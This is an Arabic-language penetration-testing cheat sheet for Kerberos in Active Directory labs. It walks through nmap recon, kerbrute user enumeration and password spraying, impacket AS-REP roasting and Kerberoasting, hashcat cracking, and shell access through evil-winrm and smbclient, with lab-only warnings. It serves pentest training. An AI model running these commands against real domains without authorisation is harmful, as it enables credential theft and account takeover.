Kerberos — من اكتشاف الـDomain إلى Roasting واختبار الوصول

مرجع سريع أثناء اللاب — Domain Detection، User Enumeration، AS-REP Roasting، Kerberoasting، واستخدام Credentials

1. Reconnaissance

حدد هل الهدف Domain Controller أو جزء من Active Directory قبل التعمق في Kerberos.

معرفة الشبكة والهدف KALI TERMINAL
ip a ip route
فحص خدمات AD الأساسية KALI TERMINAL
nmap -Pn -sV -p53,88,135,139,389,445,464,636,3268,3269 [TARGET]
وجود عدة خدمات AD مع 88/TCP غالبًا يشير إلى Domain Controller.
Kerberos يستخدم عادة 88/TCP و88/UDP للمصادقة، ويعتمد بشدة على الوقت واسم الـDomain الصحيح.

2. Port Scanning

أكد وجود Kerberos ثم اربطه بباقي خدمات Active Directory.

فحص Kerberos KALI TERMINAL
nmap -Pn -sV -p88 [TARGET]
✓ ظهور kerberos-sec على 88 يعني أن Kerberos متاح على الهدف.
فحص UDP KALI TERMINAL
sudo nmap -Pn -sU -sV -p88 [TARGET]
فحص AD أوسع KALI TERMINAL
nmap -Pn -sV -p53,88,135,139,389,445,464,636,3268,3269 [TARGET]
يساعدك تربط Kerberos مع LDAP/SMB/DNS بدل التعامل معه كخدمة منفصلة.

3. Enumeration

الهدف الأساسي هنا هو معرفة الـDomain، أسماء المستخدمين، ووجود حسابات قابلة لمسارات Kerberos شائعة.

استخراج Domain من SMB KALI TERMINAL
nmap -p445 --script=smb-os-discovery [TARGET]
إذا أعطاك Domain/Computer name سجّلها لأنها ضرورية للأدوات التالية.
Kerberos User Enumeration عبر Kerbrute KALI TERMINAL
kerbrute userenum -d [DOMAIN] --dc [TARGET] [USERLIST]
يعتمد على استجابات Kerberos للتحقق من وجود المستخدمين.
Enum4linux-ng كمسار مساعد KALI TERMINAL
enum4linux-ng -A [TARGET]
قد يعطي Domain ومستخدمين ومعلومات SMB مرتبطة بالـAD إذا كانت السياسات تسمح.
LDAP Enumeration عند توفر Anonymous/Access KALI TERMINAL
ldapsearch -x -H ldap://[TARGET] -s base
استخدم LDAP لتأكيد naming context والـDomain إذا كان الوصول يسمح.
إذا ما عندك اسم Domain صحيح، كثير من أدوات Kerberos تفشل حتى لو المنفذ مفتوح.

4. Credential Testing

اختبر بيانات الاعتماد أو ضعف Kerberos بدون حرق الحسابات أو القفز مباشرة إلى brute force.

فحص AS-REP Roastable Users KALI TERMINAL
impacket-GetNPUsers [DOMAIN]/ -dc-ip [TARGET] -usersfile [USERLIST] -no-pass
يبحث عن حسابات لا تتطلب Kerberos pre-authentication.
✓ الحصول على hash بصيغة $krb5asrep$ يعني أن الحساب قابل لـAS-REP Roasting.
اختبار Credentials مع Kerbrute KALI TERMINAL
kerbrute passwordspray -d [DOMAIN] --dc [TARGET] [USERLIST] '[PASSWORD]'
استخدم Password Spraying بدل brute force كثيف لتقليل خطر lockout.
طلب TGT ببيانات صحيحة KALI TERMINAL
impacket-getTGT [DOMAIN]/[USERNAME]:'[PASSWORD]' -dc-ip [TARGET]
نجاح إصدار TGT يؤكد أن الاعتماد صالح.
تحذير: سياسات Active Directory قد تقفل الحسابات. لا تستخدم Password Spraying إلا داخل Lab أو بيئة مصرّح بها وبمعدل منخفض.

5. Credential / Ticket Attacks

استغلال Kerberos الشائع يدور حول AS-REP Roasting وKerberoasting وإعادة استخدام التذاكر، وليس CVE عشوائي.

AS-REP Roasting KALI TERMINAL
impacket-GetNPUsers [DOMAIN]/ -dc-ip [TARGET] -usersfile [USERLIST] -format hashcat -outputfile asrep.hash
احصل على hash فقط إذا كان الحساب بدون pre-authentication.
Kerberoasting مع Credentials KALI TERMINAL
impacket-GetUserSPNs [DOMAIN]/[USERNAME]:'[PASSWORD]' -dc-ip [TARGET] -request -outputfile kerberoast.hash
يطلب Service Tickets للحسابات التي لديها SPN.
Crack AS-REP Hash KALI TERMINAL
hashcat -m 18200 asrep.hash [WORDLIST]
Crack Kerberoast Hash KALI TERMINAL
hashcat -m 13100 kerberoast.hash [WORDLIST]
نجاح cracking لا يعني أن الحساب Admin. اختبر صلاحيات الحساب على SMB/WinRM/RDP/LDAP حسب الخدمات المفتوحة.

6. Post-Exploitation

بعد الحصول على Credentials أو Ticket صالح، تحقق من نطاق الصلاحيات وانتقل للخدمة المناسبة.

اختبار SMB Access KALI TERMINAL
smbclient -L //[TARGET] -U '[DOMAIN]/[USERNAME]%[PASSWORD]'
إذا نجح، انتقل إلى SMB Cheatsheet للتعداد والاستغلال المناسب.
اختبار WinRM عند توفره KALI TERMINAL
evil-winrm -i [TARGET] -u [USERNAME] -p '[PASSWORD]'
إذا كان الحساب ضمن Remote Management Users أو Administrators فقد تحصل على shell.
فحص صلاحيات LDAP بالمستخدم KALI TERMINAL
ldapsearch -x -H ldap://[TARGET] -D '[USERNAME]@[DOMAIN]' -w '[PASSWORD]' -b '[BASE_DN]'
استخدم الحساب لجمع AD information ضمن النطاق المصرح.
التحقق من الوقت عند مشاكل Kerberos KALI TERMINAL
sudo ntpdate [TARGET]
Kerberos حساس لفارق الوقت؛ مزامنة الوقت قد تحل أخطاء KRB_AP_ERR_SKEW داخل اللاب.
بعد هذه المرحلة انتقل إلى Cheatsheet الخدمة المناسبة: SMB أو WinRM أو LDAP أو RDP. لا تكرر كل Active Directory داخل ملف Kerberos.
